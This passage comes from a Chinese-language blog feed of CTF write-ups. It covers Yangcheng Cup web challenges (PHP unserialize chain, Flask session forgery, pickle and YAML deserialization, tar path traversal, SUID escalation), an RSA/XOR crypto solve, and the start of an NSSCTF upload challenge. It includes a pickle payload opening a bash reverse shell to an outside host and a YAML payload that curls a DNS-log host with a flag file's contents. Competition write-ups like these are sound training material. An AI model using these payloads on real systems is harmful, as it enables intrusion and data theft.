/tmp/catcatf1ag.txt&quot;;s:4:&quot;rce1&quot;;s:3:&quot;123&quot;;s:3:&quot;CTF&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;b:1;&#125;&#125;s:4:&quot;fine&quot;;O:4:&quot;Yang&quot;:2:&#123;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;syssystemtem&quot;;&#125;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;b:1;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web1_2.png"></p></li></ol><h2 id="Serpent"><a href="#Serpent" class="headerlink" title="Serpent"></a>Serpent</h2><ol><li><p>访问<code>www.zip</code>，得到源码。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#源码</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/verification&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verification</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        attribute = session.get(<span class="string">&#x27;Attribute&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(attribute, <span class="built_in">dict</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Hacker!!!&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> attribute.get(<span class="string">&#x27;name&#x27;</span>) == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> attribute.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> secret</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Don&#x27;t play tricks on me&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You are a perfect stranger to me&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>抓包，在响应包里看到session，解码得到<code>secret_key</code>为<code>GWHTpNTlRMDw6p</code>。</p><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web2_1.png"></p></li><li><p>伪造session，让<code>admin</code>为1，<code>name</code>为<code>admin</code>，访问<code>/verification</code>,即可得到下一步提示。</p><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web2_2.png"></p></li><li><p>访问<code>/ppppppppppick1e</code>，在响应头看到<code>Hint: Source in /src0de</code>。</p></li><li><p>访问<code>/src0de</code>，得到源码，可以发现这是<code>pickle反序列化</code>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#源码</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src0de&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">src0de</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    rsp = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> rsp[rsp.index(<span class="string">&quot;@app.route(&#x27;/src0de&#x27;)&quot;</span>):]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ppppppppppick1e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ppppppppppick1e</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">        rsp = make_response(<span class="string">&quot;Hello, %s &quot;</span> % username)</span><br><span class="line">        rsp.headers[<span class="string">&#x27;hint&#x27;</span>] = <span class="string">&quot;Source in /src0de&quot;</span></span><br><span class="line">        pick1e = request.cookies.get(<span class="string">&#x27;pick1e&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> pick1e <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            pick1e = base64.b64decode(pick1e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> rsp</span><br><span class="line">        <span class="keyword">if</span> check(pick1e):</span><br><span class="line">            pick1e = pickle.loads(pick1e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Go for it!!!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No Way!!!&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error_message = <span class="built_in">str</span>(e)</span><br><span class="line">        <span class="keyword">return</span> error_message</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rsp</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GWHT</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure></li><li><p>经过测试，过滤了<code>R</code>，因此R指令不可用，我们使用C指令来反弹shell。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">b=<span class="string">b&quot;\x80\x03c__main__\nGWHT\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVbash -c \&#x27;bash -i &gt;&amp; /dev/tcp/7654du6216.zicp.fun/33699 0&gt;&amp;1\&#x27;\nb.&quot;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(b))</span><br><span class="line"><span class="comment">#b&#x27;gANjX19tYWluX18KR1dIVAopgX0oVl9fc2V0c3RhdGVfXwpjb3MKc3lzdGVtCnViVmJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvNzY1NGR1NjIxNi56aWNwLmZ1bi8zMzY5OSAwPiYxJwpiLg==&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web2_4.png"></p></li><li><p>成功反弹shell，在根目录发现flag，但没有权限读取。</p><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web2_3.png"></p></li><li><p>用find命令查找具有<code>SUID</code>权限的程序，发现python具有这个权限。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web2_5.png"></p></li><li><p>最后用python来读取flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;print(open(&quot;/flag&quot;).read())&#x27;</span><br></pre></td></tr></table></figure><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web2_6.png"></p></li></ol><h2 id="ArkNights"><a href="#ArkNights" class="headerlink" title="ArkNights"></a>ArkNights</h2><ol><li><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] =<span class="built_in">str</span>(uuid.uuid4()).replace(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;*&quot;</span>)+<span class="string">&quot;Boogipopisweak&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name=request.args.get(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;name&quot;</span>)</span><br><span class="line">    m1sery=[request.args.get(<span class="string">&quot;m1sery&quot;</span>,<span class="string">&quot;Doctor.Boogipop&quot;</span>)]</span><br><span class="line">    <span class="keyword">if</span>(session.get(<span class="string">&quot;name&quot;</span>)==<span class="string">&quot;Dr.Boog1pop&quot;</span>):</span><br><span class="line">        blacklist=re.findall(<span class="string">&quot;/ba|sh|\\\\|\[|]|#|system|&#x27;|\&quot;/&quot;</span>, name, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;bad hacker no way&quot;</span></span><br><span class="line">        <span class="built_in">exec</span>(<span class="string">f&#x27;for [<span class="subst">&#123;name&#125;</span>] in [<span class="subst">&#123;m1sery&#125;</span>]:print(&quot;strange?&quot;)&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;Doctor&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,name=session.get(<span class="string">&quot;name&quot;</span>))</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">        file = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">        fileblacklist=re.findall(<span class="string">&quot;/flag|fl|ag/&quot;</span>,file, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> fileblacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;bad hacker!&quot;</span></span><br><span class="line">        start=request.args.get(<span class="string">&quot;start&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        end=request.args.get(<span class="string">&quot;end&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> start==<span class="string">&quot;0&quot;</span> <span class="keyword">and</span> end==<span class="string">&quot;0&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">open</span>(file,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            start,end=<span class="built_in">int</span>(start),<span class="built_in">int</span>(end)</span><br><span class="line">            f=<span class="built_in">open</span>(file,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">            f.seek(start)</span><br><span class="line">            data=f.read(end)</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="built_in">print</span>(os.path.pardir)</span><br><span class="line">    <span class="built_in">print</span>(path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>存在非预期，用read路由直接读<code>/proc/1/environ</code>，直接得到flag。</p></li></ol><h2 id="ezyaml"><a href="#ezyaml" class="headerlink" title="ezyaml"></a>ezyaml</h2><p>yaml的反序列化+tar的路径穿越。</p><ol><li><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;bytes&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;map&#x27;</span>,<span class="string">&#x27;frozenset&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;tuple&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;object&#x27;</span>,<span class="string">&#x27;listitems&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;object&#x27;</span>,<span class="string">&#x27;apply&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> <span class="built_in">str</span>(s).lower():</span><br><span class="line">            flag= <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extractFile</span>(<span class="params">filepath, <span class="built_in">type</span></span>):</span><br><span class="line"></span><br><span class="line">    extractdir = filepath.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(extractdir):</span><br><span class="line">        os.makedirs(extractdir)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="string">&#x27;tar&#x27;</span>:</span><br><span class="line">        tf = tarfile.TarFile(filepath)</span><br><span class="line">        tf.extractall(extractdir)</span><br><span class="line">        <span class="keyword">return</span> tf.getnames()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">        fn = <span class="string">&#x27;uploads/&#x27;</span> + md5().hexdigest()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fn):</span><br><span class="line">            os.makedirs(fn)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        upFile = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(upFile)</span><br><span class="line">        <span class="keyword">if</span> re.search(<span class="string">r&quot;\.\.|/&quot;</span>, upFile.filename, re.M|re.I) != <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Hacker!&#x27;);window.location.href=&#x27;/upload&#x27;&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">        savePath = <span class="string">f&quot;uploads/<span class="subst">&#123;upFile.filename&#125;</span>&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(savePath)</span><br><span class="line">        upFile.save(savePath)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> tarfile.is_tarfile(savePath):</span><br><span class="line">            zipDatas = extractFile(savePath, <span class="string">&#x27;tar&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;result.html&#x27;</span>, path=savePath, files=zipDatas)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;upFile.filename&#125;</span> upload successfully&#x27;);history.back(-1);&lt;/script&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">src</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args:</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;config/<span class="subst">&#123;username&#125;</span>.yaml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            Config = yaml.load(f.read())</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, username=<span class="string">&quot;admin&quot;</span>, message=<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure></li><li><p>分析源码，发现当上传文件为<code>tar</code>时，会进行一个解压操作，于是想到tar路径穿越。</p></li><li><p>在<code>/src</code>路由，可以发现对<code>config</code>目录下的文件进行一个yaml的反序列化操作，于是在文件内写入exp，利用curl+dnslog实现命令外带（反弹shell不成功）。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#test.yaml</span><br><span class="line">!!python/object/apply:os.system [&#x27;curl http://kbqsag.ceye.io?flag=`cat /fllaagg_here`&#x27;]</span><br></pre></td></tr></table></figure></li><li><p>打包文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar cPvf midi.tar ../../config/test.yaml</span><br></pre></td></tr></table></figure></li><li><p>之后访问<code>/src?username=test</code>，即可成功实现外带。</p><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/web3_1.png"></p></li></ol><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="XOR贯穿始终"><a href="#XOR贯穿始终" class="headerlink" title="XOR贯穿始终"></a>XOR贯穿始终</h2><p>rsa+异或</p><ol><li><p>打开<code>massege.txt</code>，是核心价值观编码，解码后得到压缩包的解压密码。（在线网站：<a href="http://www.hiencode.com/cvencode.html%EF%BC%89">http://www.hiencode.com/cvencode.html）</a></p><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/c_1_1.png"></p></li><li><p>解压压缩包后，有一个pem文件是私钥文件，参考这个（<a href="https://zhuanlan.zhihu.com/p/461349946%EF%BC%89,%E5%8D%B3%E5%8F%AF%E5%88%86%E7%A6%BB%E5%87%BAe%EF%BC%8Cp%EF%BC%8Cq%E3%80%82">https://zhuanlan.zhihu.com/p/461349946）,即可分离出e，p，q。</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pri=<span class="string">b&quot;MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALmtMy+2uH1ZtbILSuiAukFthyQRH5mp7UmLyzZQkdg9zEP9/5tgffikQ7ytx5kHySHnazgAO1sOzmYEN4Axlev6uafiP8B1Eij97v5VkYJ1I9e3mtBNheTbXKoT8op+ASQ1fQaF4A8UzLuWeZeZI8JTH/SH+bolAK3kiZXDFdkTAgMBAAECgYEAl067LaC7Cvs2A5cMPhfYsESvIgcKN1CwW4Sd3u8dSphhgu7TgyzIuvwxbuo2g1BC6WwKhaI6vGN+csfw6nh98GEn/p3D0huNroAYvf/DRRB9UnHdttX7wB+Mv3P0RBDWHgBiCDVvHFuFUV78cIs0tnbnjxjU07aPV2XRC3AfA2ECQQDqWUNPVg3i6vTyHCL7EGkbeUheYpAAfcKCQrxjc5+5X6A+XtgHAA1JHwykPlCpHUOmlA85DJF1ejuoImzlgRLJAkEAytTCnQF+MN2r1gaAUETZyj5qMYT7Th8zKEVVVJjDawLnuX4usJ2FyRnjCkk86U75QSJhw5mMc0QnG25uGz3++w==&quot;</span></span><br><span class="line">decode_pri=<span class="built_in">hex</span>(bytes_to_long(base64.b64decode(pri)))</span><br><span class="line"><span class="built_in">print</span>(decode_pri)</span><br><span class="line">e=re.findall(<span class="string">r&#x27;0203([0-9]&#123;6&#125;)&#x27;</span>,decode_pri)</span><br><span class="line">pq=re.findall(<span class="string">r&#x27;0241(\w&#123;130&#125;)&#x27;</span>,decode_pri)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e= 0x&#x27;</span>+e[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p= 0x&#x27;</span>+pq[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q= 0x&#x27;</span>+pq[<span class="number">1</span>]) </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>常规rsa解码，但解码后发现flag后半部分是乱码。</p><p><img src="/%E7%BE%8A%E5%9F%8E%E6%9D%AF/c_1_2.png"></p></li><li><p>想到题目提示有XOR，于是将步骤一得到字符串和m异或一遍，最后得到flag。</p></li><li><p>exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pri=<span class="string">b&quot;MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALmtMy+2uH1ZtbILSuiAukFthyQRH5mp7UmLyzZQkdg9zEP9/5tgffikQ7ytx5kHySHnazgAO1sOzmYEN4Axlev6uafiP8B1Eij97v5VkYJ1I9e3mtBNheTbXKoT8op+ASQ1fQaF4A8UzLuWeZeZI8JTH/SH+bolAK3kiZXDFdkTAgMBAAECgYEAl067LaC7Cvs2A5cMPhfYsESvIgcKN1CwW4Sd3u8dSphhgu7TgyzIuvwxbuo2g1BC6WwKhaI6vGN+csfw6nh98GEn/p3D0huNroAYvf/DRRB9UnHdttX7wB+Mv3P0RBDWHgBiCDVvHFuFUV78cIs0tnbnjxjU07aPV2XRC3AfA2ECQQDqWUNPVg3i6vTyHCL7EGkbeUheYpAAfcKCQrxjc5+5X6A+XtgHAA1JHwykPlCpHUOmlA85DJF1ejuoImzlgRLJAkEAytTCnQF+MN2r1gaAUETZyj5qMYT7Th8zKEVVVJjDawLnuX4usJ2FyRnjCkk86U75QSJhw5mMc0QnG25uGz3++w==&quot;</span></span><br><span class="line">decode_pri=<span class="built_in">hex</span>(bytes_to_long(base64.b64decode(pri)))</span><br><span class="line"><span class="comment">#print(decode_pri)</span></span><br><span class="line">e=re.findall(<span class="string">r&#x27;0203([0-9]&#123;6&#125;)&#x27;</span>,decode_pri)</span><br><span class="line">pq=re.findall(<span class="string">r&#x27;0241(\w&#123;130&#125;)&#x27;</span>,decode_pri)</span><br><span class="line"><span class="comment">#print(&#x27;e= 0x&#x27;+e[0])</span></span><br><span class="line"><span class="comment">#print(&#x27;p= 0x&#x27;+pq[0])</span></span><br><span class="line"><span class="comment">#print(&#x27;q= 0x&#x27;+pq[1]) </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line"><span class="comment">#填p</span></span><br><span class="line">p = <span class="built_in">int</span>(pq[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#填q</span></span><br><span class="line">q = <span class="built_in">int</span>(pq[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="comment">#填c</span></span><br><span class="line">c=<span class="number">91817924748361493215143897386603397612753451291462468066632608541316135642691873237492166541761504834463859351830616117238028454453831120079998631107520871612398404926417683282285787231775479511469825932022611941912754602165499500350038397852503264709127650106856760043956604644700201911063515109074933378818</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">xor=bytes_to_long(<span class="string">b&#x27;C0ngr4tulati0n5_y0u_fou^d_m3&#x27;</span>)</span><br><span class="line">flag = long_to_bytes(m^xor)</span><br><span class="line"><span class="comment">#flag = long_to_bytes(m)</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;DASCTF&#123;0e2874af5e422482378640e61d919e9a&#125;&#x27;</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF_2nd_WP</title>
      <link href="/NSSCTF_2nd_WP/"/>
      <url>/NSSCTF_2nd_WP/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="php签到"><a href="#php签到" class="headerlink" title="php签到"></a>php签到</h2><p>一个文件上传的题目，重点在绕<code>pathinfo($filename, PATHINFO_EXTENSION)</code>。</p><p>参考链接：<a href="https://blog.csdn.net/weixin_44532761/article/details/121603082">2021&#x2F;11&#x2F;29文件上传-内容及其它逻辑数组绕过</a></p><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$black_list</span> = <span class="keyword">array</span>(<span class="string">&quot;ph&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;ini&quot;</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>, PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_list</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$ext</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Please re-upload&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span 